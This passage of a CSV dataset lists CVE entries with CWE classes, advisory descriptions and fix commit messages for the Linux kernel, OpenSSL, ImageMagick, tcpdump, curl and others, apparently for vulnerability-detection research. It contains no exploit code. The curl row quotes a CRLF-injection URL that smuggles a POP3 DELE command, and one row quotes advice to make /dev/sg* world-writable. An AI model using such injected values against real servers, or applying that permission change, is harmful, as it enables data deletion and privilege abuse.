lockdep splat   tracing: Check for no filter when processing event filters"
CVE-2017-1000494,CWE-119,2018-01-03,Uninitialized stack variable vulnerability in NameValueParserEndElt (upnpreplyparse.c) in miniupnpd < 2.0 allows an attacker to cause Denial of Service (Segmentation fault and Memory Corruption) or possibly have unspecified other impact,topelt field was not properly initialized.  should fix #268
CVE-2016-8690,CWE-476,2017-02-15,The bmp_getdata function in libjasper/bmp/bmp_dec.c in JasPer before 1.900.5 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted BMP image in an imginfo command.,"Also, added a --debug-level command line option to the imginfo command for debugging purposes."
CVE-2019-9162,CWE-787,2019-02-25,"In the Linux kernel before 4.20.12, net/ipv4/netfilter/nf_nat_snmp_basic_main.c in the SNMP NAT module has insufficient ASN.1 length checks (aka an array index error), making out-of-bounds read and write operations possible, leading to an OOPS or local privilege escalation. This affects snmp_version and snmp_helper.","The generic ASN.1 decoder infrastructure doesn't guarantee that callbacks will get as much data as they expect; callbacks have to check the `datalen` parameter before looking at `data`. Make sure that snmp_version() and snmp_helper() don't read/write beyond the end of the packet data.  (Also move the assignment to `pdata` down below the check to make it clear that it isn't necessarily a pointer we can use before the `datalen` check.)  Fixes: cc2d586 (""netfilter: nf_nat_snmp_basic: use asn1 decoder library"") Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2012-2686,CWE-310,2013-02-08,crypto/evp/e_aes_cbc_hmac_sha1.c in the AES-NI functionality in the TLS 1.1 and 1.2 implementations in OpenSSL 1.0.1 before 1.0.1d allows remote attackers to cause a denial of service (application crash) via crafted CBC data.,
CVE-2017-5226,CWE-20,2017-03-29,"When executing a program via the bubblewrap sandbox, the nonpriv session can escape to the parent session by using the TIOCSTI ioctl to push characters into the terminal's input buffer, allowing an attacker to escape the sandbox.","This prevents the sandboxed code from getting a controlling tty, which in turn prevents it from accessing the TIOCSTI ioctl and hence faking terminal input.  Fixes: #142 Closes: #143 Approved by: cgwalters"
CVE-2017-18190,CWE-290,2018-02-16,A localhost.localdomain whitelist entry in valid_host() in scheduler/client.c in CUPS before 2.2.2 allows remote attackers to execute arbitrary IPP commands by sending POST requests to the CUPS daemon in conjunction with DNS rebinding. The localhost.localdomain name is often resolved via a DNS server (neither the OS nor the web browser is responsible for ensuring that localhost.localdomain is 127.0.0.1).,
CVE-2012-2745,CWE-119,2012-08-09,"The copy_creds function in kernel/cred.c in the Linux kernel before 3.3.2 provides an invalid replacement session keyring to a child process, which allows local users to cause a denial of service (panic) via a crafted application that uses the fork system call.","keyctl_session_to_parent(task) sets ->replacement_session_keyring, it should be processed and cleared by key_replace_session_keyring().  However, this task can fork before it notices TIF_NOTIFY_RESUME and the new child gets the bogus ->replacement_session_keyring copied by dup_task_struct(). This is obviously wrong and, if nothing else, this leads to put_cred(already_freed_cred).  change copy_creds() to clear this member. If copy_process() fails before this point the wrong ->replacement_session_keyring doesn't matter, exit_creds() won't be called.  Cc: <stable@vger.kernel.org> Signed-off-by: Oleg Nesterov <oleg@redhat.com> Acked-by: David Howells <dhowells@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2011-3363,CWE-20,2012-05-24,"The setup_cifs_sb function in fs/cifs/connect.c in the Linux kernel before 2.6.39 does not properly handle DFS referrals, which allows remote CIFS servers to cause a denial of service (system crash) by placing a referral at the root of a share.","Currently, we skip doing the is_path_accessible check in cifs_mount if there is no prefixpath. I have a report of at least one server however that allows a TREE_CONNECT to a share that has a DFS referral at its root. The reporter in this case was using a UNC that had no prefixpath, so the is_path_accessible check was not triggered and the box later hit a BUG() because we were chasing a DFS referral on the root dentry for the mount.  This patch fixes this by removing the check for a zero-length prefixpath.  That should make the is_path_accessible check be done in this situation and should allow the client to chase the DFS referral at mount time instead.  Cc: stable@kernel.org Reported-and-Tested-by: Yogesh Sharma <ysharma@cymer.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>"
CVE-2015-0205,CWE-310,2015-01-09,"The ssl3_get_cert_verify function in s3_srvr.c in OpenSSL 1.0.0 before 1.0.0p and 1.0.1 before 1.0.1k accepts client authentication with a Diffie-Hellman (DH) certificate without requiring a CertificateVerify message, which allows remote attackers to obtain access without knowledge of a private key via crafted TLS Handshake Protocol traffic to a server that recognizes a Certification Authority with DH support.",Fix to prevent use of DH client certificates without sending certificate verify message.  If we've used a client certificate to generate the premaster secret ssl3_get_client_key_exchange returns 2 and ssl3_get_cert_verify is never called.  We can only skip the certificate verify message in ssl3_get_cert_verify if the client didn't send a certificate.  Thanks to Karthikeyan Bhargavan for reporting this issue. CVE-2015-0205 Reviewed-by: Matt Caswell <matt@openssl.org>
CVE-2016-10172,CWE-125,2017-03-14,The read_new_config_info function in open_utils.c in Wavpack before 5.1.0 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted WV file.,
CVE-2017-10661,CWE-416,2017-08-19,Race condition in fs/timerfd.c in the Linux kernel before 4.10.15 allows local users to gain privileges or cause a denial of service (list corruption or use-after-free) via simultaneous file-descriptor operations that leverage improper might_cancel queueing.,"The handling of the might_cancel queueing is not properly protected, so parallel operations on the file descriptor can race with each other and lead to list corruptions or use after free.  Protect the context for these operations with a seperate lock.  The wait queue lock cannot be reused for this because that would create a lock inversion scenario vs. the cancel lock. Replacing might_cancel with an atomic (atomic_t or atomic bit) does not help either because it still can race vs. the actual list operation.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: ""linux-fsdevel@vger.kernel.org"" Cc: syzkaller <syzkaller@googlegroups.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: linux-fsdevel@vger.kernel.org Link: http://lkml.kernel.org/r/alpine.DEB.2.20.1701311521430.3457@nanos Signed-off-by: Thomas Gleixner <tglx@linutronix.de>"
CVE-2015-4700,CWE-17,2015-08-31,The bpf_int_jit_compile function in arch/x86/net/bpf_jit_comp.c in the Linux kernel before 4.0.6 allows local users to cause a denial of service (system crash) by creating a packet filter and then loading crafted BPF instructions that trigger late convergence by the JIT compiler.,"x86 has variable length encoding. x86 JIT compiler is trying to pick the shortest encoding for given bpf instruction. While doing so the jump targets are changing, so JIT is doing multiple passes over the program. Typical program needs 3 passes. Some very short programs converge with 2 passes. Large programs may need 4 or 5. But specially crafted bpf programs may hit the pass limit and if the program converges on the last iteration the JIT compiler will be producing an image full of 'int 3' insns. Fix this corner case by doing final iteration over bpf program.  Fixes: 0a14842 (""net: filter: Just In Time compiler for x86-64"") Reported-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: Alexei Starovoitov <ast@plumgrid.com> Tested-by: Daniel Borkmann <daniel@iogearbox.net> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-12589,CWE-732,2019-06-03,"In Firejail before 0.9.60, seccomp filters are writable inside the jail, leading to a lack of intended seccomp restrictions for a process that is joined to the jail after a filter has been modified by an attacker.",avoid creating locations in the file system that are both writable and executable (in this case for processes with euid of the user).  for the same reason also remove user owned libfiles when it is not needed any more
CVE-2015-1790,,2015-06-12,"The PKCS7_dataDecodefunction in crypto/pkcs7/pk7_doit.c in OpenSSL before 0.9.8zg, 1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a PKCS#7 blob that uses ASN.1 encoding and lacks inner EncryptedContent data.",CVE-2015-1790  Reviewed-by: Rich Salz <rsalz@openssl.org>
CVE-2015-4170,CWE-362,2016-05-02,Race condition in the ldsem_cmpxchg function in drivers/tty/tty_ldsem.c in the Linux kernel before 3.13-rc4-next-20131218 allows local users to cause a denial of service (ldsem_down_read and ldsem_down_write deadlock) by establishing a new tty thread during shutdown of a previous tty thread.,"When a controlling tty is being hung up and the hang up is waiting for a just-signalled tty reader or writer to exit, and a new tty reader/writer tries to acquire an ldisc reference concurrently with the ldisc reference release from the signalled reader/writer, the hangup can hang. The new reader/writer is sleeping in ldsem_down_read() and the hangup is sleeping in ldsem_down_write() [1].  The new reader/writer fails to wakeup the waiting hangup because the wrong lock count value is checked (the old lock count rather than the new lock count) to see if the lock is unowned.  Change helper function to return the new lock count if the cmpxchg was successful; document this behavior.  [1] edited dmesg log from reporter  SysRq : Show Blocked State   task                        PC stack   pid father systemd         D ffff88040c4f0000     0     1      0 0x00000000  ffff88040c49fbe0 0000000000000046 ffff88040c4a0000 ffff88040c49ffd8  00000000001d3980 00000000001d3980 ffff88040c4a0000 ffff88040593d840  ffff88040c49fb40 ffffffff810a4cc0 0000000000000006 0000000000000023 Call Trace:  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817a6649>] schedule+0x24/0x5e  [<ffffffff817a588b>] schedule_timeout+0x15b/0x1ec  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24/0x26  [<ffffffff817aa10c>] down_read_failed+0xe3/0x1b9  [<ffffffff817aa26d>] ldsem_down_read+0x8b/0xa5  [<ffffffff8142b5ca>] ? tty_ldisc_ref_wait+0x1b/0x44  [<ffffffff8142b5ca>] tty_ldisc_ref_wait+0x1b/0x44  [<ffffffff81423f5b>] tty_write+0x7d/0x28a  [<ffffffff814241f5>] redirected_tty_write+0x8d/0x98  [<ffffffff81424168>] ? tty_write+0x28a/0x28a  [<ffffffff8115d03f>] do_loop_readv_writev+0x56/0x79  [<ffffffff8115e604>] do_readv_writev+0x1b0/0x1ff  [<ffffffff8116ea0b>] ? do_vfs_ioctl+0x32a/0x489  [<ffffffff81167d9d>] ? final_putname+0x1d/0x3a  [<ffffffff8115e6c7>] vfs_writev+0x2e/0x49  [<ffffffff8115e7d3>] SyS_writev+0x47/0xaa  [<ffffffff817ab822>] system_call_fastpath+0x16/0x1b bash            D ffffffff81c104c0     0  5469   5302 0x00000082  ffff8800cf817ac0 0000000000000046 ffff8804086b22a0 ffff8800cf817fd8  00000000001d3980 00000000001d3980 ffff8804086b22a0 ffff8800cf817a48  000000000000b9a0 ffff8800cf817a78 ffffffff81004675 ffff8800cf817a44 Call Trace:  [<ffffffff81004675>] ? dump_trace+0x165/0x29c  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff8100edda>] ? save_stack_trace+0x26/0x41  [<ffffffff817a6649>] schedule+0x24/0x5e  [<ffffffff817a588b>] schedule_timeout+0x15b/0x1ec  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817a9f03>] ? down_write_failed+0xa3/0x1c9  [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24/0x26  [<ffffffff817a9f0b>] down_write_failed+0xab/0x1c9  [<ffffffff817aa300>] ldsem_down_write+0x79/0xb1  [<ffffffff817aada3>] ? tty_ldisc_lock_pair_timeout+0xa5/0xd9  [<ffffffff817aada3>] tty_ldisc_lock_pair_timeout+0xa5/0xd9  [<ffffffff8142bf33>] tty_ldisc_hangup+0xc4/0x218  [<ffffffff81423ab3>] __tty_hangup+0x2e2/0x3ed  [<ffffffff81424a76>] disassociate_ctty+0x63/0x226  [<ffffffff81078aa7>] do_exit+0x79f/0xa11  [<ffffffff81086bdb>] ? get_signal_to_deliver+0x206/0x62f  [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf/0x16e  [<ffffffff81079b05>] do_group_exit+0x47/0xb5  [<ffffffff81086c16>] get_signal_to_deliver+0x241/0x62f  [<ffffffff810020a7>] do_signal+0x43/0x59d  [<ffffffff810f2af7>] ? __audit_syscall_exit+0x21a/0x2a8  [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf/0x16e  [<ffffffff81002655>] do_notify_resume+0x54/0x6c  [<ffffffff817abaf8>] int_signal+0x12/0x17  Reported-by: Sami Farin <sami.farin@gmail.com> Cc: <stable@vger.kernel.org> # 3.12.x Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2017-16526,CWE-119,2017-11-04,drivers/uwb/uwbd.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (general protection fault and system crash) or possibly have unspecified other impact via a crafted USB device.,"uwbd_start() calls kthread_run() and checks that the return value is not NULL. But the return value is not NULL in case kthread_run() fails, it takes the form of ERR_PTR(-EINTR).  Use IS_ERR() instead.  Also add a check to uwbd_stop().  Signed-off-by: Andrey Konovalov <andreyknvl@google.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2013-0268,CWE-264,2013-02-18,"The msr_open function in arch/x86/kernel/msr.c in the Linux kernel before 3.7.6 allows local users to bypass intended capability restrictions by executing a crafted application as root, as demonstrated by msr32.c.","At the moment the MSR driver only relies upon file system checks. This means that anything as root with any capability set can write to MSRs. Historically that wasn't very interesting but on modern processors the MSRs are such that writing to them provides several ways to execute arbitary code in kernel space. Sample code and documentation on doing this is circulating and MSR attacks are used on Windows 64bit rootkits already.  In the Linux case you still need to be able to open the device file so the impact is fairly limited and reduces the security of some capability and security model based systems down towards that of a generic ""root owns the box"" setup.  Therefore they should require CAP_SYS_RAWIO to prevent an elevation of capabilities. The impact of this is fairly minimal on most setups because they don't have heavy use of capabilities. Those using SELinux, SMACK or AppArmor rules might want to consider if their rulesets on the MSR driver could be tighter.  Signed-off-by: Alan Cox <alan@linux.intel.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: Horses <stable@kernel.org> Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2017-6892,CWE-119,2017-06-12,"In libsndfile version 1.0.28, an error in the ""aiff_read_chanmap()"" function (aiff.c) can be exploited to cause an out-of-bounds read memory access via a specially crafted AIFF file.","Secunia Advisory SA76717.  Found by: Laurent Delosieres, Secunia Research at Flexera Software"
CVE-2014-3509,CWE-362,2014-08-13,"Race condition in the ssl_parse_serverhello_tlsext function in t1_lib.c in OpenSSL 1.0.0 before 1.0.0n and 1.0.1 before 1.0.1i, when multithreading and session resumption are used, allows remote SSL servers to cause a denial of service (memory overwrite and client application crash) or possibly have unspecified other impact by sending Elliptic Curve (EC) Supported Point Formats Extension data.",
CVE-2017-15649,CWE-362,2017-10-19,"net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local users to gain privileges via crafted system calls that trigger mishandling of packet_fanout data structures, because of a race condition (involving fanout_add and packet_do_bind) that leads to a use-after-free, a different vulnerability than CVE-2017-6346.","Packet socket bind operations must hold the po->bind_lock. This keeps po->running consistent with whether the socket is actually on a ptype list to receive packets.  fanout_add unbinds a socket and its packet_rcv/tpacket_rcv call, then binds the fanout object to receive through packet_rcv_fanout.  Make it hold the po->bind_lock when testing po->running and rebinding. Else, it can race with other rebind operations, such as that in packet_set_ring from packet_rcv to tpacket_rcv. Concurrent updates can result in a socket being added to a fanout group twice, causing use-after-free KASAN bug reports, among others.  Reported independently by both trinity and syzkaller. Verified that the syzkaller reproducer passes after this patch.  Fixes: dc99f60 (""packet: Add fanout support."") Reported-by: nixioaming <nixiaoming@huawei.com> Signed-off-by: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-5350,CWE-399,2016-08-07,"epan/dissectors/packet-dcerpc-spoolss.c in the SPOOLS component in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles unexpected offsets, which allows remote attackers to cause a denial of service (infinite loop) via a crafted packet.",Use tvb_reported_length_remaining in dissect_spoolss_uint16uni. Make sure our offset always increments in dissect_spoolss_keybuffer.  Change-Id: I7017c9685bb2fa27161d80a03b8fca4ef630e793 Reviewed-on: https://code.wireshark.org/review/14687 Reviewed-by: Gerald Combs <gerald@wireshark.org> Petri-Dish: Gerald Combs <gerald@wireshark.org> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>
CVE-2017-9224,CWE-125,2017-05-24,"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds read occurs in match_at() during regular expression searching. A logical error involving order of validation and access in match_at() could result in an out-of-bounds read from a stack buffer.",
CVE-2019-13310,CWE-401,2019-07-05,ImageMagick 7.0.8-50 Q16 has memory leaks at AcquireMagickMemory because of an error in MagickWand/mogrify.c.,
CVE-2015-5283,CWE-119,2015-10-19,"The sctp_init function in net/sctp/protocol.c in the Linux kernel before 4.2.3 has an incorrect sequence of protocol-initialization steps, which allows local users to cause a denial of service (panic or memory corruption) by creating SCTP sockets before all of the steps have finished.","Consider sctp module is unloaded and is being requested because an user is creating a sctp socket.  During initialization, sctp will add the new protocol type and then initialize pernet subsys:          status = sctp_v4_protosw_init();         if (status)                 goto err_protosw_init;          status = sctp_v6_protosw_init();         if (status)                 goto err_v6_protosw_init;          status = register_pernet_subsys(&sctp_net_ops);  The problem is that after those calls to sctp_v{4,6}_protosw_init(), it is possible for userspace to create SCTP sockets like if the module is already fully loaded. If that happens, one of the possible effects is that we will have readers for net->sctp.local_addr_list list earlier than expected and sctp_net_init() does not take precautions while dealing with that list, leading to a potential panic but not limited to that, as sctp_sock_init() will copy a bunch of blank/partially initialized values from net->sctp.  The race happens like this:       CPU 0                           |  CPU 1   socket()                           |    __sock_create                     | socket()     inet_create                      |  __sock_create      list_for_each_entry_rcu(        |         answer, &inetsw[sock->type], |         list) {                      |   inet_create       /* no hits */                  |      if (unlikely(err)) {            |       ...                            |       request_module()               |       /* socket creation is blocked  |        * the module is fully loaded  |        */                            |        sctp_init                     |         sctp_v4_protosw_init         |          inet_register_protosw       |           list_add_rcu(&p->list,     |                        last_perm);   |                                      |  list_for_each_entry_rcu(                                      |     answer, &inetsw[sock->type],         sctp_v6_protosw_init         |     list) {                                      |     /* hit, so assumes protocol                                      |      * is already loaded                                      |      */                                      |  /* socket creation continues                                      |   * before netns is initialized                                      |   */         register_pernet_subsys       |  Simply inverting the initialization order between register_pernet_subsys() and sctp_v4_protosw_init() is not possible because register_pernet_subsys() will create a control sctp socket, so the protocol must be already visible by then. Deferring the socket creation to a work-queue is not good specially because we loose the ability to handle its errors.  So, as suggested by Vlad, the fix is to split netns initialization in two moments: defaults and control socket, so that the defaults are already loaded by when we register the protocol, while control socket initialization is kept at the same moment it is today.  Fixes: 4db67e8 (""sctp: Make the address lists per network namespace"") Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10057,CWE-119,2017-03-23,Buffer overflow in the WriteGROUP4Image function in coders/tiff.c in ImageMagick before 6.9.5-8 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2017-13055,CWE-125,2017-09-14,The ISO IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print_is_reach_subtlv().,"In isis_print_is_reach_subtlv() one of the case blocks did not check that the sub-TLV ""V"" is actually present and could over-read the input buffer. Add a length check to fix that and remove a useless boundary check from a loop because the boundary is tested for the full length of ""V"" before the switch block.  Update one of the prior test cases as it turns out it depended on this previously incorrect code path to make it to its own malformed structure further down the buffer, the bugfix has changed its output.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-8645,CWE-284,2016-11-28,"The TCP stack in the Linux kernel before 4.8.10 mishandles skb truncation, which allows local users to cause a denial of service (system crash) via a crafted application that makes sendto system calls, related to net/ipv4/tcp_ipv4.c and net/ipv6/tcp_ipv6.c.","With syzkaller help, Marco Grassi found a bug in TCP stack, crashing in tcp_collapse()  Root cause is that sk_filter() can truncate the incoming skb, but TCP stack was not really expecting this to happen. It probably was expecting a simple DROP or ACCEPT behavior.  We first need to make sure no part of TCP header could be removed. Then we need to adjust TCP_SKB_CB(skb)->end_seq  Many thanks to syzkaller team and Marco for giving us a reproducer.  Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Marco Grassi <marco.gra@gmail.com> Reported-by: Vladis Dronov <vdronov@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-11379,CWE-125,2018-05-22,The get_debug_info() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted PE file.,
CVE-2018-12321,CWE-125,2018-06-13,There is a heap out of bounds read in radare2 2.6.0 in java_switch_op() in libr/anal/p/anal_java.c via a crafted Java binary file.,
CVE-2017-11171,CWE-835,2017-07-11,"Bad reference counting in the context of accept_ice_connection() in gsm-xsmp-server.c in old versions of gnome-session up until version 2.29.92 allows a local attacker to establish ICE connections to gnome-session with invalid authentication data (an invalid magic cookie). Each failed authentication attempt will leak a file descriptor in gnome-session. When the maximum number of file descriptors is exhausted in the gnome-session process, it will enter an infinite loop trying to communicate without success, consuming 100% of the CPU. The graphical session associated with the gnome-session process will stop working correctly, because communication with gnome-session is no longer possible.","We used to create the GsmXSMPClient before the XSMP connection is really accepted. This can lead to some issues, though. An example is: https://bugzilla.gnome.org/show_bug.cgi?id=598211#c19. Quoting:   ""What is happening is that a new client (probably metacity in your  case) is opening an ICE connection in the GSM_MANAGER_PHASE_END_SESSION  phase, which causes a new GsmXSMPClient to be added to the client  store. The GSM_MANAGER_PHASE_EXIT phase then begins before the client  has had a chance to establish a xsmp connection, which means that  client->priv->conn will not be initialized at the point that xsmp_stop  is called on the new unregistered client.""  The fix is to create the GsmXSMPClient object when there's a real XSMP connection. This implies moving the timeout that makes sure we don't have an empty client to the XSMP server.  https://bugzilla.gnome.org/show_bug.cgi?id=598211"
CVE-2017-5509,CWE-787,2017-03-24,"coders/psd.c in ImageMagick allows remote attackers to have unspecified impact via a crafted PSD file, which triggers an out-of-bounds write.",
CVE-2018-1000204,,2018-06-26,"Linux Kernel version 3.18 to 4.16 incorrectly handles an SG_IO ioctl on /dev/sg0 with dxfer_direction=SG_DXFER_FROM_DEV and an empty 6-byte cmdp. This may lead to copying up to 1000 kernel heap pages to the userspace. This has been fixed upstream in https://github.com/torvalds/linux/commit/a45b599ad808c3c982fdcdc12b0b8611c2f92824 already. The problem has limited scope, as users don't usually have permissions to access SCSI devices. On the other hand, e.g. the Nero user manual suggests doing `chmod o+r+w /dev/sg*` to make the devices accessible. NOTE: third parties dispute the relevance of this report, noting that the requirement for an attacker to have both the CAP_SYS_ADMIN and CAP_SYS_RAWIO capabilities makes it ""virtually impossible to exploit.","This shall help avoid copying uninitialized memory to the userspace when calling ioctl(fd, SG_IO) with an empty command.  Reported-by: syzbot+7d26fc1eea198488deab@syzkaller.appspotmail.com Cc: stable@vger.kernel.org Signed-off-by: Alexander Potapenko <glider@google.com> Acked-by: Douglas Gilbert <dgilbert@interlog.com> Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2017-12168,CWE-617,2017-09-20,The access_pmu_evcntr function in arch/arm64/kvm/sys_regs.c in the Linux kernel before 4.8.11 allows privileged KVM guest OS users to cause a denial of service (assertion failure and host OS crash) by accessing the Performance Monitors Cycle Count Register (PMCCNTR).,"We're missing the handling code for the cycle counter accessed from a 32bit guest, leading to unexpected results.  Cc: stable@vger.kernel.org # 4.6+ Signed-off-by: Wei Huang <wei@redhat.com> Signed-off-by: Marc Zyngier <marc.zyngier@arm.com>"
CVE-2012-2133,CWE-399,2012-07-03,"Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.","hugetlbfs_{get,put}_quota() are badly named.  They don't interact with the general quota handling code, and they don't much resemble its behaviour. Rather than being about maintaining limits on on-disk block usage by particular users, they are instead about maintaining limits on in-memory page usage (including anonymous MAP_PRIVATE copied-on-write pages) associated with a particular hugetlbfs filesystem instance.  Worse, they work by having callbacks to the hugetlbfs filesystem code from the low-level page handling code, in particular from free_huge_page(). This is a layering violation of itself, but more importantly, if the kernel does a get_user_pages() on hugepages (which can happen from KVM amongst others), then the free_huge_page() can be delayed until after the associated inode has already been freed.  If an unmount occurs at the wrong time, even the hugetlbfs superblock where the ""quota"" limits are stored may have been freed.  Andrew Barry proposed a patch to fix this by having hugepages, instead of storing a pointer to their address_space and reaching the superblock from there, had the hugepages store pointers directly to the superblock, bumping the reference count as appropriate to avoid it being freed. Andrew Morton rejected that version, however, on the grounds that it made the existing layering violation worse.  This is a reworked version of Andrew's patch, which removes the extra, and some of the existing, layering violation.  It works by introducing the concept of a hugepage ""subpool"" at the lower hugepage mm layer - that is a finite logical pool of hugepages to allocate from.  hugetlbfs now creates a subpool for each filesystem instance with a page limit set, and a pointer to the subpool gets added to each allocated hugepage, instead of the address_space pointer used now.  The subpool has its own lifetime and is only freed once all pages in it _and_ all other references to it (i.e. superblocks) are gone.  subpools are optional - a NULL subpool pointer is taken by the code to mean that no subpool limits are in effect.  Previous discussion of this bug found in:  ""Fix refcounting in hugetlbfs quota handling."". See:  https://lkml.org/lkml/2011/8/11/28 or http://marc.info/?l=linux-mm&m=126928970510627&w=1  v2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to alloc_huge_page() - since it already takes the vma, it is not necessary.  Signed-off-by: Andrew Barry <abarry@cray.com> Signed-off-by: David Gibson <david@gibson.dropbear.id.au> Cc: Hugh Dickins <hughd@google.com> Cc: Mel Gorman <mgorman@suse.de> Cc: Minchan Kim <minchan.kim@gmail.com> Cc: Hillf Danton <dhillf@gmail.com> Cc: Paul Mackerras <paulus@samba.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2012-0036,CWE-89,2012-04-13,"curl and libcurl 7.2x before 7.24.0 do not properly consider special characters during extraction of a pathname from a URL, which allows remote attackers to conduct data-injection attacks via a crafted URL, as demonstrated by a CRLF injection attack on the (1) IMAP, (2) POP3, or (3) SMTP protocol.","Protocols (IMAP, POP3 and SMTP) that use the path part of a URL in a decoded manner now use the new Curl_urldecode() function to reject URLs with embedded control codes (anything that is or decodes to a byte value less than 32).  URLs containing such codes could easily otherwise be used to do harm and allow users to do unintended actions with otherwise innocent tools and applications. Like for example using a URL like pop3://pop3.example.com/1%0d%0aDELE%201 when the app wants a URL to get a mail and instead this would delete one.  This flaw is considered a security vulnerability: CVE-2012-0036  Security advisory at: http://curl.haxx.se/docs/adv_20120124.html  Reported by: Dan Fandrich"
CVE-2018-16451,CWE-125,2019-10-03,The SMB parser in tcpdump before 4.9.3 has buffer over-reads in print-smb.c:print_trans() for \MAILSLOT\BROWSE and \PIPE\LANMAN.,
CVE-2012-2319,CWE-264,2012-05-17,"Multiple buffer overflows in the hfsplus filesystem implementation in the Linux kernel before 3.3.5 allow local users to gain privileges via a crafted HFS plus filesystem, a related issue to CVE-2009-4020.","Commit ec81aec (""hfs: fix a potential buffer overflow"") fixed a few potential buffer overflows in the hfs filesystem.  But as Timo Warns pointed out, these changes also need to be made on the hfsplus filesystem as well.  Reported-by: Timo Warns <warns@pre-sense.de> Acked-by: WANG Cong <amwang@redhat.com> Cc: Alexey Khoroshilov <khoroshilov@ispras.ru> Cc: Miklos Szeredi <mszeredi@suse.cz> Cc: Sage Weil <sage@newdream.net> Cc: Eugene Teo <eteo@redhat.com> Cc: Roman Zippel <zippel@linux-m68k.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Christoph Hellwig <hch@lst.de> Cc: Alexey Dobriyan <adobriyan@gmail.com> Cc: Dave Anderson <anderson@redhat.com> Cc: stable <stable@vger.kernel.org> Cc: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-5508,CWE-119,2017-03-24,Heap-based buffer overflow in the PushQuantumPixel function in ImageMagick before 6.9.7-3 and 7.x before 7.0.4-3 allows remote attackers to cause a denial of service (application crash) via a crafted TIFF file.,
CVE-2013-4563,CWE-189,2013-11-20,"The udp6_ufo_fragment function in net/ipv6/udp_offload.c in the Linux kernel through 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly perform a certain size comparison before inserting a fragment header, which allows remote attackers to cause a denial of service (panic) via a large IPv6 UDP packet, as demonstrated by use of the Token Bucket Filter (TBF) queueing discipline.","Commit 1e2bd51 (""udp6: Fix udp fragmentation for tunnel traffic."") changed the calculation if there is enough space to include a fragment header in the skb from a skb->mac_header dervived one to skb_headroom. Because we already peeled off the skb to transport_header this is wrong. Change this back to check if we have enough room before the mac_header.  This fixes a panic Saran Neti reported. He used the tbf scheduler which skb_gso_segments the skb. The offsets get negative and we panic in memcpy because the skb was erroneously not expanded at the head.  Reported-by: Saran Neti <Saran.Neti@telus.com> Cc: Pravin B Shelar <pshelar@nicira.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
